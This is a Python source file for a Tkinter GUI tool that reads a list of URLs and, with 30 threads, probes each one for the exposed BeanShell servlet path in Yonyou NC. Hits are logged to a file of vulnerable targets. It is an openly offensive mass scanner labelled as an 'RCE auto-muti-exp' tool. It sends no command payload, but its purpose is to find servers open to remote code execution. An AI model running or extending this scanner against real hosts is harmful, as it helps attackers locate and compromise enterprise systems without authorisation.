import requests
import tkinter as tk
from tkinter import *
from PIL.ImageTk import PhotoImage
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def yync_exp(url):
    poc = r"""/servlet//~ic/bsh.servlet.BshServlet"""
    url = url + poc
    try:
        res = requests.get(url, timeout=3)
        if "BeanShell" in res.text:
            yync_rce_text.insert(END,"[! ! ! ! ! ! ] Vulnerable url:" + url + "\n")
            yync_rce_text.see(END)
            with open ("[exists]yync_RCE_url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            yync_rce_text.insert(END, "[×]URL without vulnerability:" + url + "\n")
            yync_rce_text.see(END)
    except Exception as err:
        yync_rce_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
        yync_rce_text.see(END)
def get_yync_addr():
    with open("corrected url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def yync_rce_gui():
    yync_rce = Toplevel()
    yync_rce.geometry("1035x455")
    yync_rce.title("yonyou NC RCE [auto-muti-exp]")
    yync_rce.resizable(0, 0)
    logo = PhotoImage(file="./logo.ico")
    yync_rce.tk.call('wm', 'iconphoto', yync_rce._w, logo)
    global yync_rce_text
    yync_rce_text = scrolledtext.ScrolledText(yync_rce,width=123, height=25)
    yync_rce_text.grid(row=0, column=0, padx=10, pady=10)
    yync_rce_text.see(END)
    addrs = get_yync_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(yync_exp, addr)
    yync_rce.mainloop()